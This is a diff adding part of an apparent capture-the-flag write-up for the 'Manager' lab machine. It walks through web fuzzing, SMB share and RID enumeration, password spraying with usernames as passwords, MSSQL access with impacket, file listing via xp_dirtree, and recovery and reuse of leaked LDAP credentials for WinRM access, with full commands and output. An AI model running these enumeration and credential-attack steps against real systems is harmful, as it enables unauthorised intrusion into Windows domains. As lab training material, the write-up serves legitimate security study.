@@ -127,7 +127,236 @@ Host script results:
 
 ## Web Enumeration - Port 80
 
+Potential User `JohnDue` was found while enumerating the website but does not appear to be a valid user.
 
+Performed web directory fuzzing:
+
+```bash
+ffuf -c -u http://manager.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -ic
+
+images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 90ms]
+                        [Status: 200, Size: 18203, Words: 6791, Lines: 507, Duration: 63ms]
+Images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 69ms]
+css                     [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 393ms]
+js                      [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 96ms]
+IMAGES                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 86ms]
+CSS                     [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 235ms]
+JS                      [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 204ms]
+                        [Status: 200, Size: 18203, Words: 6791, Lines: 507, Duration: 97ms]
+```
+
+## SMB Enumeration
+
+Used `crackmapexec` to enumerate shares:
+
+```bash
+crackmapexec smb 10.10.11.236 -u 'guest' -p '' --shares
+
+SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: 
+SMB         10.10.11.236    445    DC01             [+] Enumerated shares
+SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
+SMB         10.10.11.236    445    DC01             -----           -----------     ------
+SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.236    445    DC01             C$                              Default share
+SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.236    445    DC01             NETLOGON                        Logon server share 
+SMB         10.10.11.236    445    DC01             SYSVOL                          Logon server share
+```
+
+If we can get access to IPC$ share (i.e. Read Only IPC$), this signifies that we can enumerate usernames.
+
+```bash
+crackmapexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute
+
+SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: 
+SMB         10.10.11.236    445    DC01             [+] Brute forcing RIDs
+SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
+SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
+SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
+SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
+SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
+SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
+SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
+SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
+SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
+SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
+SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
+SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
+SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
+SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
+
+```
+
+Checked if usernames were reused as passwords:
+
+```bash
+crackmapexec smb 10.10.11.236 -u userlist -p userlist --no-brute --continue-on-success
+
+SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
+```
+
+Checked WinRM but user doesn't have access:
+
+```bash
+crackmapexec winrm 10.10.11.236 -u 'operator' -p 'operator' 
+SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
+HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
+WINRM       10.10.11.236    5985   DC01             [-] manager.htb\operator:operator
+```
+
+## MSSQL - Port 1433
+
+Used `operator:operator` credentials to login via `mssqlclient.py`:
+
+```bash
+ython3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (MANAGER\Operator  guest@master)>
+```
+
+`mssqlclient.py` has extra shortcut commands to help enumerate and exploit mssql. We can start by enumerating the databases, and see that only the default ones exist:
+
+```bash
+SQL (MANAGER\Operator  guest@master)> enum_db
+name     is_trustworthy_on   
+------   -----------------   
+master                   0   
+
+tempdb                   0   
+
+model                    0   
+
+msdb                     1
+```
+
+We do not have RCE via `xp_cmdshell`:
+
+```bash
+SQL (MANAGER\Operator  guest@master)> xp_cmdshell
+ERROR: Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
+```
+
+We are able to list files and folders on the machine with `xp_dirtree`:
+
+```bash
+SQL (MANAGER\Operator  guest@master)> xp_dirtree 
+subdirectory                depth   file   
+-------------------------   -----   ----   
+$Recycle.Bin                    1      0   
+
+Documents and Settings          1      0   
+
+inetpub                         1      0   
+
+PerfLogs                        1      0   
+
+Program Files                   1      0   
+
+Program Files (x86)             1      0   
+
+ProgramData                     1      0   
+
+Recovery                        1      0   
+
+SQL2019                         1      0   
+
+System Volume Information       1      0   
+
+Users                           1      0   
+
+Windows                         1      0
+```
+
+Enumerating the files and folders, I can see a backup ZIP file titled `website-backup-27-07-23-old.zip`:
+
+```bash
+SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
+subdirectory                      depth   file   
+-------------------------------   -----   ----   
+about.html                            1      1   
+
+contact.html                          1      1   
+
+css                                   1      0   
+
+images                                1      0   
+
+index.html                            1      1   
+
+js                                    1      0   
+
+service.html                          1      1   
+
+web.config                            1      1   
+
+website-backup-27-07-23-old.zip       1      1
+```
+
+I pulled this ZIP file down via the website and found a hidden file titled `.old-conf.xml` which contains credentials for the user `raven@manager.htb`.
+
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+   <server>
+      <host>dc01.manager.htb</host>
+      <open-port enabled="true">389</open-port>
+      <secure-port enabled="false">0</secure-port>
+      <search-base>dc=manager,dc=htb</search-base>
+      <server-type>microsoft</server-type>
+      <access-user>
+         <user>raven@manager.htb</user>
+         <password>R4v3nBe5tD3veloP3r!123</password>
+      </access-user>
+      <uid-attribute>cn</uid-attribute>
+   </server>
+   <search type="full">
+      <dir-list>
+         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
+      </dir-list>
+   </search>
+</ldap-conf>
+```
+
+Credentials: `raven:R4v3nBe5tD3veloP3r!123`
+
+Confirmed `raven:R4v3nBe5tD3veloP3r!123` has winrm access.
+
+```bash
+crackmapexec winrm 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
+
+SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
+HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
+WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
+```
 
 
 
